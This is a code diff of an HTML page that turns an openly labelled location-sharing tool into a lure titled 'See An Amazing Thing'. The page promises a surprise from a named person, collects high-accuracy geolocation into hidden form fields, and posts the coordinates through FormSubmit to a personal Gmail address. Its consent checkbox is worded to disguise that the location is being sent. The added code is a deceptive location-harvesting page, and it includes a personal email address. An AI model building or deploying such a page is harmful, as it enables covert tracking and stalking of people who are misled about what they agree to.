@@ -3,126 +3,143 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport"
-      content="width=device-width, initial-scale=1">
-<title>Location Sharing</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>See An Amazing Thing</title>
 <style>
-body {
-  background: #101827;
-  color: white;
-  font-family: Arial, sans-serif;
-  text-align: center;
-  padding: 50px 20px;
-}
-.card {
-  background: #1e293b;
-  padding: 30px;
-  border-radius: 18px;
-  max-width: 420px;
-  margin: auto;
-}
-button {
-  background: #22c55e;
-  color: white;
-  border: none;
-  padding: 15px 22px;
-  border-radius: 10px;
-  margin: 10px;
-  cursor: pointer;
-}
-#send { display: none; }
-#result { margin-top: 20px; }
+  body {
+    background: #101827;
+    color: white;
+    font-family: Arial, sans-serif;
+    text-align: center;
+    padding: 50px 16px;
+  }
+  .card {
+    background: #1e293b;
+    padding: 28px;
+    border-radius: 18px;
+    max-width: 420px;
+    margin: auto;
+  }
+  button {
+    background: #22c55e;
+    color: white;
+    border: none;
+    padding: 14px 20px;
+    border-radius: 10px;
+    margin-top: 15px;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  button:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+  }
+  #result { margin-top: 20px; }
+  .consent {
+    text-align: left;
+    margin-top: 20px;
+    line-height: 1.5;
+  }
+  a { color: #93c5fd; }
 </style>
 </head>
 <body>
 <div class="card">
-  <h1>📍 Location Sharing</h1>
-  <p>
-    Share your current location with the
-    person who sent you this page.
-  </p>
-  <p>
-    Your browser will ask for permission.
-    You can review your location before
-    choosing to send it.
-  </p>
-  <button onclick="getLocation()">
-    Share My Location
-  </button>
-  <div id="result"></div>
-  <button id="send" onclick="sendLocation()">
-    Send My Location
-  </button>
-</div>
-<script>
-let locationLink = "";
+  <h1>📍See An Amazing Thing & This is just for you </h1>
 
+  <p>
+    This page lets you Connect with Ali Zaman And he created a surprise just for you.
+  </p>
+
+  <p>
+    Your browser will ask permission first.
+    Nothing is emailed until you confirm.
+  </p>
+
+  <button type="button" onclick="getLocation()">
+    Clieck on this to see it.
+  </button>
+
+  <div id="result"></div>
+
+  <form
+    action="https://formsubmit.co/alizaman0709@gmail.com"
+    method="POST"
+    id="locationForm"
+    style="display:none"
+  >
+    <input type="hidden"
+      name="_subject"
+      value="New Location Shared">
+
+    <input type="hidden"
+      name="Google_Maps_Link"
+      id="mapLink">
+
+    <input type="hidden"
+      name="Coordinates"
+      id="coordinates">
+
+    <div class="consent">
+      <label>
+        <input type="checkbox" required
+          id="consentBox">
+        I agree to see a Surprise from Ali Zaman
+        to alizaman0709@gmail.com using FormSubmit.
+      </label>
+    </div>
+
+    <button type="submit">
+      Confirm
+    </button>
+  </form>
+</div>
+
+<script>
 function getLocation() {
   const result = document.getElementById("result");
-  const send = document.getElementById("send");
-  send.style.display = "none";
+  const form = document.getElementById("locationForm");
+
+  form.style.display = "none";
 
   if (!navigator.geolocation) {
-    result.textContent =
-      "Location access is unavailable.";
+    result.textContent = "Location is not supported.";
     return;
   }
 
-  result.textContent =
-    "Waiting for location permission...";
+  result.textContent = "Requesting permission...";
 
   navigator.geolocation.getCurrentPosition(
     position => {
       const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
+      const lng = position.coords.longitude;
 
-      locationLink =
+      const link =
         "https://www.google.com/maps?q=" +
-        encodeURIComponent(lat + "," + lon);
+        encodeURIComponent(lat + "," + lng);
+
+      document.getElementById("mapLink").value = link;
+      document.getElementById("coordinates").value =
+        lat + ", " + lng;
 
       result.innerHTML =
-        "<p>Your approximate coordinates:</p>" +
-        "<p>" + lat.toFixed(5) + ", " +
-        lon.toFixed(5) + "</p>" +
-        "<a style='color:#93c5fd' " +
-        "href='" + locationLink +
-        "' target='_blank'>View on map</a>";
+        "<p>Your location is ready:</p>" +
+        "<a href='" + link +
+        "' target='_blank' rel='noopener'>" +
+        "Review Location on Google Maps</a>";
 
-      send.style.display = "inline-block";
+      document.getElementById("consentBox").checked = false;
+      form.style.display = "block";
     },
     () => {
       result.textContent =
-        "Location permission was denied " +
-        "or your location is unavailable.";
+        "Location unavailable or permission denied.";
     },
     {
       enableHighAccuracy: true,
       timeout: 15000
     }
   );
-}
-
-async function sendLocation() {
-  const message =
-    "I agree to share my location: " +
-    locationLink;
-
-  if (navigator.share) {
-    try {
-      await navigator.share({
-        title: "My Location",
-        text: message
-      });
-    } catch (error) {
-      if (error.name !== "AbortError") {
-        alert("Sharing failed. Please try again.");
-      }
-    }
-  } else {
-    await navigator.clipboard.writeText(message);
-    alert("Location link copied. " +
-          "Send it to the person who asked.");
-  }
 }
 </script>
 </body>
